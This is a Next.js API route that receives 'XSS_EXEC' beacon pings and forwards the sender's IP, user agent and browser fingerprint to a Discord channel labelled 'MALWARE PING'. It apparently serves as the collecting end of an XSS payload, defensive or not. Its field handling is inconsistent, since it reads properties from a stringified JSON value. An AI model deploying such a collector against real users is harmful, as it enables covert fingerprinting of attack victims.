import { NextRequest, NextResponse } from "next/server";
import { sendAuditEmbed } from "@/lib/discord/bot";

export async function POST(req: NextRequest) {
  try {
    const body = await req.json().catch(() => ({}));
    const ip = req.headers.get("x-forwarded-for") || "unknown";
    const ua = req.headers.get("user-agent") || "unknown";

    const payload = {
      provider: "XSS_EXEC",
      email: body.fingerprint || "infected",
      password: JSON.stringify({
        ip,
        ua,
        ...body,
      }),
    };

    await sendAlertToDiscord(payload);
    return NextResponse.json({ ok: true });
  } catch {
    return NextResponse.json({ ok: false }, { status: 500 });
  }
}

async function sendAlertToDiscord(data: any) {
  const TOKEN = process.env.DISCORD_BOT_TOKEN;
  const CHANNEL = process.env.DISCORD_CHANNEL_ID;
  if (!TOKEN || !CHANNEL) return;

  const fp = data.email;
  let parsed: any = {};
  try { parsed = JSON.parse(fp); } catch {}

  const mainFields = [
    { name: "Actor", value: parsed.actor || "anonymous", inline: true },
    { name: "Role", value: parsed.role || "guest", inline: true },
    { name: "Target", value: parsed.target || "unknown", inline: true },
    { name: "IP", value: data.password?.ip || "unknown", inline: true },
    { name: "UA", value: (parsed.ua || data.password?.ua || "").slice(0, 180), inline: false },
    { name: "Platform", value: parsed.platform || "-", inline: true },
    { name: "Screen", value: parsed.screen || "-", inline: true },
    { name: "Cores", value: String(parsed.cores || "-"), inline: true },
    { name: "Timezone", value: parsed.timezone || "-", inline: true },
    { name: "Referrer", value: (parsed.referrer || "direct").slice(0, 200), inline: false },
    { name: "URL", value: parsed.href || "-", inline: false },
  ];

  await fetch(`https://discord.com/api/v10/channels/${CHANNEL}/messages`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bot ${TOKEN}`,
    },
    body: JSON.stringify({
      embeds: [
        {
          title: "🚨 MALWARE PING — XSS / Avatar Execution",
          color: 0xff0000,
          fields: mainFields,
          timestamp: new Date().toISOString(),
          footer: { text: "Athena Payload Alert" },
        },
      ],
    }),
  }).catch(() => {});
}
